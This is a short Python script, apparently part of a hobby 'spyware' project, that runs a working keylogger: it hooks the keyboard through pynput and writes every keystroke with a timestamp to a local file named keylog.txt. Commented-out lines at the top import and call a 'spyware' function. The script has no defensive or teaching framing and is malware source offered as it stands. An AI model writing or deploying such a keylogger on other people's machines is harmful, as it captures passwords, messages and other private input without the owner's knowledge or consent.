# from Spyware import spyware

# def main():
#     print("UP")
#     spyware()
    
# if __name__ == '__main__':
#     main()    
	
from pynput.keyboard import Key, Listener
import logging
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()